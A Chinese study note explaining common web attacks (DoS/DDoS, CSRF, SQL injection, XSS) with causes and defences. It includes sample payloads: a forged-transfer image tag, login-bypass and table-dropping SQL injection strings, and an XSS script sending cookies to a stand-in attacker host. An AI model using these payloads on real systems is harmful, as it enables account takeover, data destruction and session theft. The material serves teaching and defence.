[TOC]

## Web攻击技术

### 1 Dos攻击

DOS（Denial of Service attack）是一种针对服务器的能够让服务器呈现静止状态的攻击方式。有时候也叫服务停止攻击或**拒绝服务攻击**。其原理就是发送大量的合法请求到服务器，服务器无法分辨这些请求是正常请求还是攻击请求，所以都会照单全收。海量的请求会造成服务器停止工作或拒绝服务的状态。这就是 Dos 攻击。



### 2 DDOS攻击

分布式拒绝服务攻击（Distributed Denial of Service），简单说就是发送大量请求是使服务器瘫痪。DDos攻击是在 DOS 攻击基础上的，攻击者借助公共网络，将大数量的计算机设备联合起来，向一个或多个目标进行攻击。

##### 案例

- SYN Flood ,简单说一下 TCP 三次握手，客户端服务器发出请求，请求建立连接，然后服务器返回一个报文，表明请求以被接受，然后客户端也会返回一个报文，最后建立连接。那么如果有这么一种情况，攻击者伪造 IP 地址，发出报文给服务器请求连接，这个时候服务器接受到了，根据 TCP 三次握手的规则，服务器也要回应一个报文，可是这个 IP 是伪造的，报文回应给谁呢，第二次握手出现错误，第三次自然也就不能顺利进行了，这个时候服务器收不到第三次握手时客户端发出的报文，又再重复第二次握手的操作。如果攻击者伪造了大量的 IP 地址并发出请求，这个时候服务器将维护一个非常大的半连接等待列表，占用了大量的资源，最后服务器瘫痪。
- CC 攻击，在应用层http协议上发起攻击，模拟正常用户发送大量请求直到该网站拒绝服务为止。

##### 被攻击的原因

服务器带宽不足，不能挡住攻击者的攻击流量

##### 预防

最直接的方法增加带宽。但是攻击者用各地的电脑进行攻击，他的带宽不会耗费很多钱，但对于服务器来说，带宽非常昂贵。
云服务提供商有自己的一套完整 DDoS 解决方案，并且能提供丰富的带宽资源。



### 3 CSRF跨站点请求伪造

跨站请求伪造 CSRF (cross site request forgery), 指通过**伪装成受信任用户**的进行访问，通俗的讲就是说访问了 A 网站，然后 cookie 存在了浏览器，然后又访问了一个流氓网站，不小心点了流氓网站一个链接（向 A 发送请求），这个时候流氓网站利用了用户的身份对 A 进行了访问。是指攻击者通过已经设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新。

属于被动攻击。更简单的理解就是攻击者盗用了用户的名义发送了请求。

##### 案列

一个 CSRF 最简单的例子就是用户 A 登录了网站 A 在虚拟账户里转账了 1000 块钱，用户 A 在本地生成了网站 A 的 cookie，用户 A 在没有关闭网站 A 的情况下有访问了恶意网站 B，恶意网站 B 包含请求 A 网站的代码，利用了本地的 cookie 经过身份验证的身份又向网站 A 发送了一次请求，这时用户就会发现在网站 A 的账户又少了 1000块。这就是基本的 CSRF 攻击方式。

这个例子可能现实中不会存在，但是攻击的方式是一样的。比如说用户登录了 A 银行网站，然后又访问了室友给的一个流氓网站，然后点了里面的一个链接  www.A.com/transfer?account=666&money=10000, 那么这个时候很可能就向账号为 666 的人转了 1w 软妹币。
注意这个攻击方式不一定是我点了这个链接，也可以是这个网站里面一些资源请求指向了这个转账链接，比如说一个

```html
<img src="http://www.A.com/transfer?account=666&money=10000">
```

##### 被攻击的原因

用户本地存储 cookie，攻击者利用用户的 cookie 进行认证，然后**伪造用户**发出请求。

##### 预防

之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的 cookie，那么如果我们不用 cookie 来验证不就可以预防了。所以我们可以**采用 token（不存储于浏览器）认证**。
通过 referer 识别，HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行 A 网站才能进行转账了。



### 4 SOL注入攻击

是指通过对 web 连接的数据库发送恶意的 SQL 语句而产生的攻击，从而产生安全隐患和对网站的威胁，可以造成逃过验证或者私密信息泄露等危害。SQ L注入的原理是**通过在对 SQL 语句调用方式上的疏漏**，恶意注入 SQL语句。

##### 案例

' or '1'= '1。这是最常见的 SQL 注入攻击，当我们输如用户名 jiajun ，然后密码输如 'or '1'= '1 的时候，我们在查询用户名和密码是否正确的时候，本来要执行的是 

```sql
select * from user where username='' and password=''
```

经过参数拼接后，会执行 SQL 语句 

```sql
select * from user where username='jaijun' and password=' ' or ' 1'='1 '
```

这个个时候 1=1 是成立，自然就跳过验证了。
但是如果再严重一点，密码输如的是 

```sql
';drop table user;-- '
```

那么 SQL 命令为

```sql
select * from user where username='jiajun' and password='';drop table user;--' 
```

这个时候我们就直接把这个表给删除了

##### 被攻击的原因

SQL 语句伪造参数，然后在对参数进行拼接的后形成破坏性的 SQL 语句，最后导致数据库受到攻击。

##### 预防

在 Java 中，我们可以使用**预编译语句**(PreparedStatement)，这样的话即使我们使用 SQL 语句伪造成参数，到了服务端的时候，这个伪造 SQL 语句的参数也只是**简单的字符**，并不能起到攻击的作用。
很多 ORM 框架已经可以对参数进行**转义**。
做最坏的打算，即使被’拖库‘('脱裤，数据库泄露')。数据库中密码不应明文存储的，可以对密码加密，为了加大破解成本，所以可以采用加盐的（数据库存储用户名，盐（随机字符长），md5后的密文）方式。



### 5 XSS攻击

跨站脚本攻击（Cross-Site scripting），是指在通过注册的网站用户的浏览器**内运行非法的HTML标签或javascript**，从而达到攻击的目的，如盗取用户的 cookie，改变网页的 DOM 结构，重定向到其他网页等。

##### 案列

比如说我写了一个博客网站，然后攻击者在上面发布了一个文章，内容是这样的

```html
<script>window.open(“www.gongji.com?param=”+document.cookie)</script>
```

如果我没有对他的内容进行处理，直接存储到数据库，那么下一次当其他用户访问他的这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的 cookie 发送到攻击者的服务器了。

##### 被攻击的原因

用户输入的数据变成了代码，比如说上面的 \<script>,应该只是字符串却有了代码的作用。

##### 预防

将输入的数据进行转义处理，比如说讲 < 转义成&lt。






**参考资料**

- https://blog.csdn.net/zhydream77/article/details/85694614











